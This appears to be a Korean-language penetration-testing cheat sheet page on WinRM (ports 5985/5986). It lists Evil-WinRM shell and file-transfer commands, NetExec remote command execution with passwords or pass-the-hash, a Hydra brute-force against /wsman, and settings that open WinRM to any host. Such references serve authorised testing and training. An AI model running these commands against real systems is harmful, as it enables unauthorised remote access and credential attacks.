---
sidebar_position: 14
---

# WinRM - 5985/5986

## 기본 정보

**포트**: 5985 (HTTP), 5986 (HTTPS)

WinRM(Windows Remote Management)은 Windows 시스템의 원격 관리를 위한 프로토콜입니다.

## Evil-WinRM

```bash
# 기본 연결
evil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD>

# 인증서 기반 연결
evil-winrm -i <RHOST> -c /PATH/TO/CERTIFICATE/<CERTIFICATE>.crt -k /PATH/TO/PRIVATE/KEY/<KEY>.key -p -u -S
```

### Evil-WinRM 내부 명령어

```powershell
# 파일 업로드
*Evil-WinRM* PS> upload /path/to/local/file C:\path\to\remote\file

# 파일 다운로드
*Evil-WinRM* PS> download C:\path\to\remote\file /path/to/local/file

# PowerShell 스크립트 로드
*Evil-WinRM* PS> menu

# 서비스 목록
*Evil-WinRM* PS> services

# 프로세스 목록
*Evil-WinRM* PS> processes
```

## NetExec

```bash
# 명령 실행
netexec winrm <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -X <COMMAND>

# 해시 사용
netexec winrm <RHOST> -u '<USERNAME>' -H '<HASH>' -X <COMMAND>

# 여러 호스트 스캔
netexec winrm <RHOST_RANGE> -u '<USERNAME>' -p '<PASSWORD>'
```

## Nmap

```bash
# WinRM 포트 스캔
sudo nmap -p5985,5986 -sV <RHOST>

# WinRM 정보 수집
sudo nmap -p5985 --script http-methods <RHOST>
```

## Hydra 브루트포스

```bash
# WinRM 브루트포스
hydra -L users.txt -P passwords.txt <RHOST> http-post -m "/wsman"
```

## PowerShell Remoting

```powershell
# PowerShell에서 WinRM 세션 생성
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<USERNAME>', $password)
Enter-PSSession -ComputerName <RHOST> -Credential $cred

# 명령 실행
Invoke-Command -ComputerName <RHOST> -Credential $cred -ScriptBlock { whoami }

# 스크립트 실행
Invoke-Command -ComputerName <RHOST> -Credential $cred -FilePath C:\path\to\script.ps1
```

## WinRM 활성화 (로컬)

```powershell
# WinRM 서비스 시작
Enable-PSRemoting -Force

# 방화벽 규칙 추가
Set-NetFirewallRule -Name "WINRM-HTTP-In-TCP" -RemoteAddress Any

# TrustedHosts 설정
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force

# 설정 확인
winrm get winrm/config
```

## 참고

- WinRM 활성화 여부 확인
- 5985 (HTTP) vs 5986 (HTTPS)
- Remote Server Administration 그룹 멤버 확인
- Pass-the-Hash 가능
- Evil-WinRM으로 쉘 획득
- PowerShell Remoting 사용 가능
